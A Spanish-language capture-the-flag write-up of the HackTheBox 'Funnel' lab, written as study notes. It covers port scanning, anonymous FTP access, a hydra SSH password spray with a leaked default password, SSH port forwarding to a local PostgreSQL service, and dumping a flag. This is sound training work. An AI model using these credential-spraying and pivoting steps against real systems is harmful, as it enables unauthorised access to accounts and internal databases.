# Funnel

> 🧠 **Plataforma:** HackTheBox
>
> 💻 **Sistema operativo:** Linux
>
> 🎯 **Nivel:** Very Easy
>
> ✅ **Estado:** Done
>
> 📘 **Curso eJPT:** yes
>
> 🗓️ **Fecha de creación:** 7 de enero de 2025 21:15
>
> 🌐 **IP:** `10.129.88.226`

---


## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.88.226 -oG allports

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p21,22 -sCV 10.129.88.226 -oN targeted
```

- **Identificación de vulnerabilidades**

- 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- 21/tcp open  ftp     vsftpd 3.0.3

```bash
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

- Enumeramos FTP (port 21)
    
    ```bash
    # Conectamos con el FTP sin credenciales
    
     ftp anonymous@10.129.88.226
     ftp> ls
    229 Entering Extended Passive Mode (|||58764|)
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
    226 Directory send OK.
    ftp> cd mail_backup
    250 Directory successfully changed.
    ftp> ls
    229 Entering Extended Passive Mode (|||18439|)
    150 Here comes the directory listing.
    -rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
    -rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
    
    # Descargamos todos los ficheros del directorio
    ftp> mget *
    226 Transfer complete.
    713 bytes received in 00:00 (2.67 KiB/s)
    ```
    
    Revisamos los documentos descargados
    
    ```bash
    cat welcome_28112022
    ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
           │ File: welcome_28112022
    ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       1   │ Frome: root@funnel.htb
       2   │ To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
       3   │ Subject:Welcome to the team!
    ```
    
    Enumeramos los siguientes usuarios: 
    
    - root
    - optimus
    - albert
    - andreas
    - christine
    - maria
    
    Enumerando el otro archivo vemos :
    
    ![image.png](<imagenes/image 82.png>)
    
    Por lo que tenemos un password potencial: **funnel123#!#**
    

## Explotación

<aside>
💡 Intentamos el acceso con las credenciales

</aside>

### Explotación 1

Creamos dos listas, una con el password y la otra con los usuarios para ver con cual aplica

![image.png](<imagenes/image 83.png>)

![image.png](<imagenes/image 84.png>)

```bash
❯ hydra -L users.txt -P password.txt 10.129.88.226 ssh # 10.129.88.226 ssh
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 21:33:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking ssh://10.129.88.226:22/
[22][ssh] host: 10.129.88.226   login: christine   password: funnel123#!#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-07 21:33:59
```

Encontramos usuario “Christine” con password “funnel123#!#

### Explotación 2

Accedemos por ssh como usuario “Christine” y password anterior

```bash
❯ ssh christine@10.129.88.226
christine@funnel:~$
```

### Explotación 3

Vemos que en la maquina, hay corriendo el servicio postresql , pero únicamente en el local host

Hacemos local port forwarding

```bash
❯ ssh -L 1111:127.0.0.1:5432 christine@10.129.88.226
```

Una vez establecida conexión por SSH, conectamos desde nuestra maquina (local) a psql

```bash
❯ psql -h 127.0.0.1 -p 1111 -U christine
```

Enumeramos la BD:

```sql

# \l para listar todas las bases de datos

christine-# \l

Listado de base de datos
Nombre   |   Dueño   | Codificación | Proveedor de locale |  Collate   |   Ctype    | Configuración regional | Reglas ICU: |       Privilegios       
-----------+-----------+--------------+---------------------+------------+------------+------------------------+-------------+-------------------------
 christine | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | 
 postgres  | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | 
 secrets   | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | 
 template0 | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | =c/christine           +
           |           |              |                     |            |            |                        |             | christine=CTc/christine
 template1 | christine | UTF8         | libc                | en_US.utf8 | en_US.utf8 |                        |             | =c/christine           +
           |           |              |                     |            |            |                        |             | christine=CTc/christine
```

Vemos la tabla secrets. 

```sql
# \c para cambiar de base de datos
# \dt para ver el contenido de la base de datos

christine-# \c secrets
psql (17.2 (Debian 17.2-1), servidor 15.1 (Debian 15.1-1.pgdg110+1))
Ahora está conectado a la base de datos «secrets» con el usuario «christine».
secrets-# \dt
        Listado de relaciones
 Esquema | Nombre | Tipo  |   Dueño   
---------+--------+-------+-----------
 public  | flag   | tabla | christine
(1 fila)

# SELECT * FROM <table_name>; Para ver contenido

secrets-# select * from flag;
value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 fila)
```

Flag: cf277664b1771217d7006acdea006db1

## Explotación posterior

<aside>
💡 No hay escalada de privilegios

</aside>

### Conclusión

<aside>
💡 Maquina facil y interesante. Me ha servido para aprender conceptos de local port forwardin (ssh)

</aside>